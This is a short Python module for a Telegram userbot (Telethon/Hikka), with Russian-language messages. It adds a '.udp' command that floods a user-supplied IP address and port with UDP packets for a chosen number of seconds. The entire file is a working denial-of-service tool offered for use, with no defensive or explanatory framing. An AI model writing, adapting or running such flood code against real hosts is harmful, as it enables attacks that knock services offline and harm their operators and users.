import socket
import asyncio
from telethon import events

class UdpFloodModule:
    def __init__(self, bot):
        self.bot = bot
        self.bot.add_event_handler(self.udp_command, events.NewMessage(patterns='.udp'))

    async def udp_command(self, event):
        args = event.text.split()[1:]
        if len(args) != 3:
            await event.respond("Использование: .udp ip port sec")
            return

        ip, port, sec = args
        try:
            port = int(port)
            sec = int(sec)
        except ValueError:
            await event.respond("Ошибка: порт и секунды должны быть числами.")
            return

        await event.respond(f"Начинаем отправку пакетов на {ip}:{port} на {sec} секунд...")
        await self.udp_flood(ip, port, sec)
        await event.respond("Отправка пакетов завершена.")

    async def udp_flood(self, ip, port, duration):
        start_time = asyncio.get_event_loop().time()
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while True:
                if (asyncio.get_event_loop().time() - start_time) > duration:
                    break
                try:
                    sock.sendto(b'RandomData', (ip, port))
                except Exception as e:
                    print(f"Ошибка отправки: {e}")

# Инициализация модуля
my_bot = ...  # Сюда нужно поместить вашего Hikka userbot
module = UdpFloodModule(my_bot)
